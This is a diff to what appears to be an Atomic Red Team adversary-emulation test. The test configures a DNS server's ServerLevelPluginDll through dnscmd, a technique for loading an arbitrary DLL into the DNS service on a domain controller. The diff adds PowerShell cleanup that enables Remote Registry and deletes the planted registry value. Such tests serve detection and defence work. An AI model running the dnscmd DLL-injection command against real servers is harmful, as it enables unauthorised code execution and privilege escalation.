@@ -78,7 +78,28 @@ atomic_tests:
       Write-Host "1. This computer must be manually joined to a domain"
       Write-Host "2. The binary of DnsCmd must be present on the system (through RSAT or Features on Demand)"
   executor:
-    name: command_prompt
+    name: powershell
     elevation_required: false
     command: |
       dnscmd.exe "#{target_dns}" /config /ServerLevelPluginDll "#{dll_path}"
+      
+      # Let some time for the attack to generate the required Windows events
+      Start-Sleep -Seconds 10
+      
+      # Enable Remote Registry
+      Set-Service -ComputerName "#{target_dns}" -Name RemoteRegistry -Status Running
+
+      # Remove the newly created registry key (otherwise the DNS will be broken at next reboot)
+      $registryHive = Invoke-Expression '[Microsoft.Win32.RegistryHive]::LocalMachine' -ErrorAction Stop
+      $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($registryHive, '#{target_dns}')
+      $regValue = 'ServerLevelPluginDll'
+      # Path before the patch (the DC is vulnerable)
+      $key = $reg.OpenSubKey('SYSTEM\CurrentControlSet\Services\DNS\Parameters', $true)
+      if (($key -ne $null) -and ($key.GetValueNames() -contains $regValue)) {
+        $key.DeleteValue($regValue)
+      }
+      # Path after the patch (when the DC is not vulnerable anymore)
+      $key2 = $reg.OpenSubKey('SYSTEM\CurrentControlSet\Services\DNS\InternalParameters', $true)
+      if (($key2 -ne $null) -and ($key2.GetValueNames() -contains $regValue)) {
+          $key2.DeleteValue($regValue)
+      }
